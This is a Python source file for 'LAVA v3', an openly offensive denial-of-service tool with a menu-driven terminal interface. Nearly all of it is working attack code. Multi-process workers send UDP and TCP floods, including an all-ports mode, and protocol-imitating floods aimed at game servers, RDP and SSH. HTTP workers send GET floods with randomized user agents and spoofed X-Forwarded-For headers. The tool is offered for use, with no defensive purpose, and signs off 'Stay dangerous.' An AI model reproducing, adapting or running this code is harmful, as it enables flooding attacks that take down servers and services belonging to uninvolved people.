#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  LAVA v3 — ALL PURPLE BOLD DOTTED BANNER + Multi-Core Attack Engine       ║
# ║  MAXIMUM POWER — 10Gbps+ Bandwidth Capable                                ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

import os
import sys
import time
import socket
import random
import struct
import string
import threading
import multiprocessing
import ctypes
import signal
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

# ═══════════════════════════════════════════════════════════════════════════════
#  ANSI COLOR ENGINE — ALL PURPLE
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    
    @staticmethod
    def rgb(r, g, b):
        return f'\033[38;2;{r};{g};{b}m'
    
    @staticmethod
    def bg_rgb(r, g, b):
        return f'\033[48;2;{r};{g};{b}m'

# ═══════════════════════════════════════════════════════════════════════════════
#  DOTTED BANNER — EXACT FROM SCREENSHOT
# ═══════════════════════════════════════════════════════════════════════════════

DOTTED_BANNER = [
    ".:.:.:.::.:.:.:.:..:.:.:.:.:..:.:.:.:.:..:.: : :....:.: :.:....:.: :.:....:.: .......:.: :......:..............................:..........:..",
    "   .:...:........:.:..............................:....... . ........ .......... .......... .......... .........................................",
    "   .:.:.:.::.:.:.:.:....:.. ..:..:.:.:.:.:..:.:.:.:.:..:.: :.:.:..:.: :.:....:.: ..:....:.: :..........:.:....:.:..........:......:..........:..",
    "   .....:........:.:.             .....:....... .......... .......... :......... .......... ....................................................",
    "   .:.:.:.::.:.:.:..     .:.:      ..:.:.:..:.:.:.:.:..:.: :.:.:..:.: :.:....:.: :.:..:.:.:.:.:....:.:.:.:....:.................................",
    "   .....:.........      ....................... ..:....... .......... :......... .......... .......... .........................................",
    "   .:.:.:.::.:.: .      ..:.:.:..:.:.:.:.:..:.:.:.:....... ...   .:.: :.:....:.: .........: ..................:............. ......   ..........",
    "   .....:.......       .......:..................               ..... :.........       ....      ....... .............              ............",
    "   .:.:.:.::.:.:       .:.:.:.:..:.:.:.:.:..:..      ..         ..:.: :.:.....        ....       .....    ....:.:..      ...        .............",
    "   ...:.:......       ......................      :.....       ...... :.:..          .....             ..........     ......        ............",
    "   .:.:.:.:..:.       ..:.:.:.:..:.:.:.:.:.     ..:.:..:      .:..:.: :.:.   ..      ...:.           ..:.......      ....:...     ..............",
    "   .:...:.....       .........:........:.       ..:....      ........ .   ....      .......       .... ......       .......       ..............",
    "   .:.:.:.::.:       ...:.:.:.:..:.:.:.:.     ..:.:.:.       :.:..:.:     ...:      ....:.:     ...:.. ......      .......       ...............",
    "   ...:.:....      ...........:.. ......     .. . ..         ........ . .....      ........     ............      ......         ...... ........",
    "   .:.:.:.:.      ...::.:.:.:.:.   ..: .     .:.:.:   .      :.:.   . :.:....      :....:.    :..:.:.:.:...       ......        ..:..    .......",
    "   ......                        .....        .     ..            ... :.:....        ..     .......... ....        .     .              ........",
    "   .:.:                          :.:.:..           .:.           .:.: :.:....               :......:.......            ...            ..........",
    "   .... .......:.:..... . . . .......:....  . . ..:..... . . ........ ..:....... . .  . ... .......... ...... . . . ........ . . ................",
    "   .:.:.:.:..:.:.:.:.::.:.:.:.:..:.:.:.:.:..:.:.:.:.:..:.: :.:....:.. :.:....:.: ..:....:.:........:..............................:.............",
    "   .....:.........................................:....... . ........ :......... .......... ....................................................",
]

def print_dotted_banner():
    PURPLE = C.rgb(160, 32, 240)
    for line in DOTTED_BANNER:
        print(f"{PURPLE}{C.BOLD}{line}{C.RESET}")

# ═══════════════════════════════════════════════════════════════════════════════
#  UI — EXACT SCREENSHOT REPLICA
# ═══════════════════════════════════════════════════════════════════════════════

def print_header():
    print(f"{C.CYAN}TELEGRAM: [T.He/LavaV2]{C.RESET}    {C.MAGENTA}CHANNEL: [T.He/LavaV2]{C.RESET}")

def print_main_screen():
    os.system('clear' if os.name != 'nt' else 'cls')
    print_header()
    print()
    print_dotted_banner()
    print()
    print(f"        Welcome to Lava (V3)")
    print(f"{C.BRIGHT_BLACK}        (Type \"?\" for the help page){C.RESET}")
    print()
    print_prompt()

def print_prompt():
    print(f"{C.BRIGHT_GREEN}[media-abh{C.RESET}@{C.BRIGHT_MAGENTA}Lava{C.RESET}]{C.RESET}")

def print_methods_screen():
    os.system('clear' if os.name != 'nt' else 'cls')
    
    print(f"{C.BRIGHT_YELLOW}# Lava Method Page {C.BRIGHT_BLACK}• {C.BRIGHT_GREEN}Power Status [FULL]{C.RESET}")
    print()
    print_dotted_banner()
    print()
    
    print(f"{C.BRIGHT_YELLOW}## {C.CYAN}(UDP){C.RESET}")
    print(f"  {C.BRIGHT_BLACK}-{C.RESET} {C.BRIGHT_WHITE}U-GBPS{C.RESET}")
    print(f"  {C.BRIGHT_BLACK}-{C.RESET} {C.BRIGHT_WHITE}U-PPS{C.RESET}")
    print(f"  {C.BRIGHT_BLACK}-{C.RESET} {C.BRIGHT_WHITE}T-PASS{C.RESET}")
    print()
    
    print(f"{C.BRIGHT_YELLOW}## {C.CYAN}(TCP){C.RESET}")
    for method in ['S-SUBN', 'S-FIVE', 'S-T53', 'S-JAVA', 'S-DISC', 'S-RDP', 'S-GAME', 'S-SAMP', 'S-SSH']:
        print(f"  {C.BRIGHT_BLACK}-{C.RESET} {C.BRIGHT_WHITE}{method}{C.RESET}")
    print()
    
    print(f"{C.BRIGHT_YELLOW}## {C.CYAN}(HTTP){C.RESET}")
    print(f"  {C.BRIGHT_BLACK}-{C.RESET} {C.BRIGHT_WHITE}H-TLS{C.RESET}")
    print(f"  {C.BRIGHT_BLACK}-{C.RESET} {C.BRIGHT_WHITE}H-EMU{C.RESET}")
    print()
    
    print(f"{C.BRIGHT_YELLOW}## {C.CYAN}(TIPS){C.RESET}")
    print(f"  {C.BRIGHT_BLACK}-{C.RESET} port 0 uses all ports (make sure to try this)")
    print(f"  {C.BRIGHT_BLACK}-{C.RESET} port on H-methods does not matter")
    print()
    
    print_prompt()

def print_attack_sent(target, port, duration, method):
    os.system('clear' if os.name != 'nt' else 'cls')
    
    print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}                                                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}           {C.BRIGHT_WHITE}! Your Attack Was Sent !{C.RESET}                        {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}                                                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   {C.BRIGHT_CYAN}Target:{C.RESET}    [{C.BRIGHT_WHITE}{target}{C.RESET}]                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   {C.BRIGHT_CYAN}Port:{C.RESET}      [{C.BRIGHT_WHITE}{port}{C.RESET}]                                  {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   {C.BRIGHT_CYAN}Duration:{C.RESET}  [{C.BRIGHT_WHITE}{duration}{C.RESET}]                                {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   {C.BRIGHT_CYAN}Method:{C.RESET}    [{C.BRIGHT_WHITE}{method.lower().replace('_', '-')}{C.RESET}]                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   {C.BRIGHT_CYAN}Sent In:{C.RESET}   [{C.BRIGHT_WHITE}{time.time():.6f}s{C.RESET}]                         {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   {C.BRIGHT_CYAN}Sent By:{C.RESET}   [{C.BRIGHT_WHITE}media-abh{C.RESET}]                             {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}                                                              {C.CYAN}║{C.RESET}")
    print(f"{C.MAGENTA}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
    print()
    print_prompt()

# ═══════════════════════════════════════════════════════════════════════════════
#  MAXIMUM POWER ATTACK ENGINE — 10Gbps+ Capable
# ═══════════════════════════════════════════════════════════════════════════════

class MegaAttackEngine:
    def __init__(self):
        self.processes = []
        self.threads = []
        self.active = False
        self.stats = {
            'packets': multiprocessing.Value('Q', 0),
            'bytes': multiprocessing.Value('Q', 0),
            'errors': multiprocessing.Value('Q', 0)
        }
        self.cpu_count = multiprocessing.cpu_count()
        self.manager = multiprocessing.Manager()
        self.status_queue = self.manager.Queue()
        
    def _set_cpu_affinity(self, core):
        try:
            os.sched_setaffinity(0, {core % self.cpu_count})
        except:
            try:
                import psutil
                p = psutil.Process()
                p.cpu_affinity([core % self.cpu_count])
            except:
                pass
    
    def _set_realtime_priority(self):
        try:
            os.nice(-20)
        except:
            pass
        try:
            import resource
            resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
            resource.setrlimit(resource.RLIMIT_MEMLOCK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
        except:
            pass
        
        try:
            import ctypes
            libc = ctypes.CDLL('libc.so.6')
            SCHED_RR = 2
            sched_param = ctypes.c_int(99)
            libc.sched_setscheduler(0, SCHED_RR, ctypes.byref(sched_param))
        except:
            pass
    
    def _generate_gbps_payload(self):
        return random._urandom(65507)
    
    def _generate_pps_payload(self):
        return random._urandom(random.randint(64, 256))
    
    def udp_gbps_worker(self, target, port, duration, worker_id, core_id, stats_pkt, stats_bytes, stats_err):
        self._set_cpu_affinity(core_id)
        self._set_realtime_priority()
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**24)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DONT)
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        payload = self._generate_gbps_payload()
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        if port == 0:
            ports = list(range(1, 65536))
            random.shuffle(ports)
            port_iter = iter(ports)
        else:
            port_iter = None
        
        while self.active and time.time() < end_time:
            try:
                if port == 0:
                    try:
                        dst_port = next(port_iter)
                    except StopIteration:
                        random.shuffle(ports)
                        port_iter = iter(ports)
                        dst_port = next(port_iter)
                else:
                    dst_port = port
                
                sock.sendto(payload, (target, dst_port))
                stats_pkt.value += 1
                stats_bytes.value += len(payload)
            except:
                stats_err.value += 1
    
    def udp_pps_worker(self, target, port, duration, worker_id, core_id, stats_pkt, stats_bytes, stats_err):
        self._set_cpu_affinity(core_id)
        self._set_realtime_priority()
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**24)
        
        payload = self._generate_pps_payload()
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        while self.active and time.time() < end_time:
            try:
                dst_port = random.randint(1, 65535) if port == 0 else port
                sock.sendto(payload, (target, dst_port))
                stats_pkt.value += 1
                stats_bytes.value += len(payload)
            except:
                stats_err.value += 1
    
    def tcp_bass_worker(self, target, port, duration, worker_id, core_id, stats_pkt, stats_bytes, stats_err):
        self._set_cpu_affinity(core_id)
        self._set_realtime_priority()
        
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        while self.active and time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((target, port))
                data = random._urandom(random.randint(64, 1024))
                s.send(data)
                s.close()
                stats_pkt.value += 1
                stats_bytes.value += len(data)
            except:
                stats_err.value += 1
    
    def special_worker(self, target, port, duration, method, worker_id, core_id, stats_pkt, stats_bytes, stats_err):
        self._set_cpu_affinity(core_id)
        self._set_realtime_priority()
        
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        payloads = {
            'S-SUBN': b'\xff\xff\xff\xff' + random._urandom(65503),
            'S-FIVE': b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73\x0a' * 500,
            'S-T53': b'\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x00' + random._urandom(1000),
            'S-JAVA': b'\xfe\x01\xfa\x00\x0b\x00\x4d\x00\x43\x00\x7c\x00' + random._urandom(1000),
            'S-DISC': b'\x00\x00\x00\x00\x00\x00\x00\x00' + random._urandom(1400),
            'S-RDP': b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00' + random._urandom(1000),
            'S-GAME': random._urandom(1400),
            'S-SAMP': b'\x53\x41\x4d\x50\x03\x70\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31' + random._urandom(1000),
            'S-SSH': b'\x53\x53\x48\x2d\x32\x2e\x30\x2d\x4f\x70\x65\x6e\x53\x53\x48\x5f\x38\x2e\x39' + random._urandom(1000),
        }
        
        payload = payloads.get(method, random._urandom(1400))
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**24)
        
        while self.active and time.time() < end_time:
            try:
                dst_port = random.randint(1, 65535) if port == 0 else port
                sock.sendto(payload, (target, dst_port))
                stats_pkt.value += 1
                stats_bytes.value += len(payload)
            except:
                stats_err.value += 1
    
    def http_worker(self, target, port, duration, method, worker_id, core_id, stats_pkt, stats_bytes, stats_err):
        self._set_cpu_affinity(core_id)
        self._set_realtime_priority()
        
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        ]
        
        paths = ['/', '/index.html', '/api/v1', '/login', '/admin', '/home', '/dashboard', '/config']
        
        while self.active and time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target, port))
                
                if method == 'H-TLS' or port == 443:
                    import ssl
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target)
                
                ua = random.choice(uas)
                path = random.choice(paths)
                host = target.split(':')[0]
                
                req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.9\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
                    f"\r\n"
                ).encode()
                
                s.send(req)
                stats_pkt.value += 1
                stats_bytes.value += len(req)
                s.close()
            except:
                stats_err.value += 1
    
    def launch(self, method, target, port, duration, threads=None):
        self.stop()
        self.active = True
        
        if threads is None:
            threads = self.cpu_count * 16  # MAXIMUM THREADS for 10Gbps+
        
        try:
            target_ip = socket.gethostbyname(target)
        except:
            target_ip = target
        
        print_attack_sent(target, port, duration, method)
        
        worker_map = {
            'U-GBPS': self.udp_gbps_worker,
            'U-PPS': self.udp_pps_worker,
            'T-PASS': self.tcp_bass_worker,
            'T-BASS': self.tcp_bass_worker,
            'H-TLS': self.http_worker,
            'H-EMU': self.http_worker,
        }
        
        if method.startswith('S-'):
            worker_func = self.special_worker
        else:
            worker_func = worker_map.get(method, self.udp_gbps_worker)
        
        monitor = threading.Thread(target=self._monitor, args=(duration,))
        monitor.daemon = True
        monitor.start()
        
        processes_to_spawn = min(threads, self.cpu_count * 16)
        
        print(f"{C.BRIGHT_CYAN}[+] Launching {processes_to_spawn} workers across {self.cpu_count} cores{C.RESET}")
        print(f"{C.BRIGHT_GREEN}[+] Target: {target_ip}:{port} | Method: {method} | Duration: {duration}s{C.RESET}")
        print(f"{C.BRIGHT_MAGENTA}[+] MAXIMUM POWER MODE ENGAGED — 10Gbps+ CAPABLE{C.RESET}")
        print()
        
        for i in range(processes_to_spawn):
            core_id = i % self.cpu_count
            p = multiprocessing.Process(
                target=worker_func,
                args=(target_ip, port, duration, i, core_id, 
                      self.stats['packets'], self.stats['bytes'], self.stats['errors'])
            )
            p.daemon = True
            p.start()
            self.processes.append(p)
        
        if duration > 0:
            time.sleep(duration)
            self.stop()
    
    def _monitor(self, duration):
        start = time.time()
        last_pkts = 0
        last_bytes = 0
        
        while self.active:
            time.sleep(1)
            elapsed = time.time() - start
            pkts = self.stats['packets'].value
            bytes_total = self.stats['bytes'].value
            errors = self.stats['errors'].value
            
            pps = pkts / elapsed if elapsed > 0 else 0
            gbps = (bytes_total * 8) / (elapsed * 1_000_000_000) if elapsed > 0 else 0
            
            current_pkts = pkts - last_pkts
            current_bytes = bytes_total - last_bytes
            current_gbps = (current_bytes * 8) / 1_000_000_000
            
            last_pkts = pkts
            last_bytes = bytes_total
            
            status_line = (
                f"\r{C.BRIGHT_CYAN}[LAVA]{C.RESET} "
                f"{C.BRIGHT_GREEN}Pkts:{C.RESET}{pkts:>12,} "
                f"{C.BRIGHT_YELLOW}PPS:{C.RESET}{pps:>8,.0f} "
                f"{C.BRIGHT_MAGENTA}BW:{C.RESET}{gbps:>6.2f}Gbps "
                f"{C.BRIGHT_CYAN}Cur:{C.RESET}{current_gbps:>5.2f}Gbps "
                f"{C.BRIGHT_RED}Err:{C.RESET}{errors:>6,} "
                f"{C.BRIGHT_BLACK}Time:{C.RESET}{elapsed:>4.0f}s{C.RESET}"
            )
            print(status_line, end="", flush=True)
            
            if duration > 0 and elapsed >= duration:
                break
    
    def stop(self):
        self.active = False
        for p in self.processes:
            try:
                p.terminate()
                p.join(timeout=2)
                if p.is_alive():
                    p.kill()
            except:
                pass
        self.processes.clear()
        print(f"\n{C.BRIGHT_GREEN}[✓] Attack halted. Total packets: {self.stats['packets'].value:,}{C.RESET}")

# ═══════════════════════════════════════════════════════════════════════════════
#  COMMAND PARSER
# ═══════════════════════════════════════════════════════════════════════════════

engine = MegaAttackEngine()

def parse_command(cmd):
    cmd = cmd.strip().upper()
    parts = cmd.split()
    
    if not parts:
        return True
    
    if cmd == '?' or cmd == 'HELP':
        print_methods_screen()
        return True
    
    if cmd == '.CLEAR' or cmd == 'CLEAR':
        print_main_screen()
        return True
    
    if cmd == '.STOP' or cmd == 'STOP':
        engine.stop()
        print_prompt()
        return True
    
    if cmd in ['.EXIT', 'EXIT', '.QUIT', 'QUIT']:
        engine.stop()
        print(f"\n{C.BRIGHT_MAGENTA}LAVA signing off. Stay dangerous.{C.RESET}\n")
        return False
    
    methods = ['U-GBPS', 'U-PPS', 'T-PASS', 'T-BASS', 'S-SUBN', 'S-FIVE', 'S-T53', 
               'S-JAVA', 'S-DISC', 'S-RDP', 'S-GAME', 'S-SAMP', 'S-SSH',
               'H-TLS', 'H-EMU']
    
    if parts[0] in methods:
        if len(parts) < 4:
            print(f"{C.BRIGHT_RED}[!] Usage: {parts[0]} <target> <port> <duration> [threads]{C.RESET}")
            print_prompt()
            return True
        
        target = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
        threads = int(parts[4]) if len(parts) > 4 else None
        
        t = threading.Thread(target=engine.launch, args=(parts[0], target, port, duration, threads))
        t.daemon = True
        t.start()
        return True
    
    print(f"{C.BRIGHT_RED}[!] Unknown command: {cmd}{C.RESET}")
    print(f"{C.BRIGHT_BLACK}    Type ? for help{C.RESET}")
    print_prompt()
    return True

# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    print_main_screen()
    
    while True:
        try:
            cmd = input()
            if not parse_command(cmd):
                break
        except KeyboardInterrupt:
            print(f"\n{C.BRIGHT_YELLOW}[!] Use .exit to quit or .stop to halt attacks{C.RESET}")
            print_prompt()
        except EOFError:
            break

if __name__ == '__main__':
    try:
        os.nice(-20)
    except:
        pass
    
    try:
        multiprocessing.set_start_method('fork', force=True)
    except:
        pass
    
    main()
